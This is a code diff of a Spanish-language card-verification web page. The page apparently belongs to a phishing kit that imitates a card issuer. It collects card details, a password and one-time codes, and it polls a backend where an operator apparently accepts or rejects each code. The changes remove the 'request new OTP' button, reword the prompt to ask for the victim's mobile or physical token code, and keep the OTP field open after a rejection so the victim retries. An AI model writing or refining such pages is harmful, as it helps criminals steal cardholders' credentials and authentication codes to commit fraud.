@@ -286,30 +286,6 @@
             flex-shrink: 0;
         }
 
-        .otp-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 8px;
-            flex-wrap: wrap;
-        }
-
-        .otp-actions .btn-link {
-            background: none;
-            border: none;
-            color: var(--mc-red);
-            font-size: 0.8125rem;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 4px 0;
-            text-decoration: underline;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .otp-actions .btn-link:hover {
-            color: var(--mc-red-hover);
-        }
-
-        /* BOTONES */
         .button-group {
             display: flex;
             gap: 12px;
@@ -585,7 +561,7 @@
                 <div class="error-message">La contraseña es requerida</div>
             </div>
 
-            <!-- OTP (OCULTO) -->
+            <!-- OTP ACTUALIZADO -->
             <div class="otp-section" id="otpSection">
                 <div class="otp-info">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -593,15 +569,12 @@
                         <path d="M12 8v4"/>
                         <path d="M12 16h.01"/>
                     </svg>
-                    <span>Se ha enviado un código de 6 dígitos a tu dispositivo registrado</span>
+                    <span>Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
                 </div>
                 <div class="form-group" style="margin-bottom:0;">
                     <label class="form-label">Código OTP <span class="required">*</span></label>
-                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa el código OTP" maxlength="6" inputmode="numeric" required />
-                    <div class="error-message">El código OTP debe tener 6 dígitos</div>
-                </div>
-                <div class="otp-actions">
-                    <button type="button" class="btn-link" id="requestNewOtp">Solicitar nuevo OTP</button>
+                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="6" inputmode="numeric" required />
+                    <div class="error-message">El código debe tener 6 dígitos</div>
                 </div>
             </div>
 
@@ -903,9 +876,20 @@
                 } else if (resultado === 'rechazar_otp') {
                     clearInterval(pollingInterval);
                     pollingInterval = null;
+                    // Mostrar error y mantener la sección OTP visible
                     mostrarError('❌ Código OTP incorrecto. Intente de nuevo.');
-                    resetFormulario();
-                    ocultarOTP();
+                    // Limpiar el campo OTP
+                    confirmationInput.value = '';
+                    confirmationInput.focus();
+                    // Reactivar el botón
+                    submitButton.disabled = false;
+                    buttonText.textContent = 'Verificar OTP';
+                    loadingOverlay.classList.remove('active');
+                    // Mantener la sección OTP visible
+                    otpSection.classList.add('visible');
+                    pasoActual = 'otp';
+                    // Habilitar el campo OTP
+                    confirmationInput.disabled = false;
                     return;
                 }
             }, POLLING_INTERVAL);
@@ -1091,12 +1075,6 @@
                 sessionStorage.removeItem('cardExpiry');
                 window.location.href = 'index.html';
             }
-        });
-
-        document.getElementById('requestNewOtp').addEventListener('click', function() {
-            alert('📱 Se ha enviado un nuevo código OTP a tu dispositivo registrado.');
-            confirmationInput.value = '';
-            confirmationInput.focus();
         });
     </script>
 </body>
